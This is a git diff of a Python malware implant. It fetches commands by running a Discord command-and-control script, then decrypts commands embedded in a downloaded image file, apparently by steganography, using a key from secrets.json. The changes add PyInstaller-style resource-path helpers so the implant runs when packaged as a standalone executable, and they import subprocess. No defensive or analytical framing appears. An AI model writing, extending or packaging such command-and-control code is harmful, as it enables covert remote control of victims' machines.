@@ -11,12 +11,25 @@ import packetsniff
 from os import remove
 from sys import argv
 
+import subprocess
 
 import time
 import json
 import sys
 
-f = open('secrets.json')
+def app_path():
+    if getattr(sys, 'frozen', False):
+        app_path = os.path.dirname(sys.executable)
+    elif __file__:
+        app_path = os.path.dirname(__file__)
+    return app_path
+
+def resource_path(relative_path):
+    if hasattr(sys, '_MEIPASS'):
+        return os.path.join(sys._MEIPASS, relative_path)
+    return os.path.join(os.path.abspath("."), relative_path)
+
+f = open(resource_path('secrets.json'))
 secrets = json.load(f)
 
 SLEEP_TIME = 5
@@ -34,10 +47,11 @@ def unwrap_command(embedded_command, key):
     return command
 
 def fetch_command():
-    os.system('python3 ./c2_discord.py')
-    if exists(secrets["IMAGE_DOWNLOAD_PATH"]):
-        command = unwrap_command(secrets["IMAGE_DOWNLOAD_PATH"], secrets["ENCRYPTION_KEY"])
-        os.remove(secrets["IMAGE_DOWNLOAD_PATH"])
+    filepath = resource_path('c2_discord.py')
+    os.system(f'python3 {filepath}')
+    if exists(resource_path(secrets["IMAGE_DOWNLOAD_PATH"])):
+        command = unwrap_command(resource_path(secrets["IMAGE_DOWNLOAD_PATH"]), secrets["ENCRYPTION_KEY"])
+        os.remove(resource_path(secrets["IMAGE_DOWNLOAD_PATH"]))
     else:
         command = None
     return command
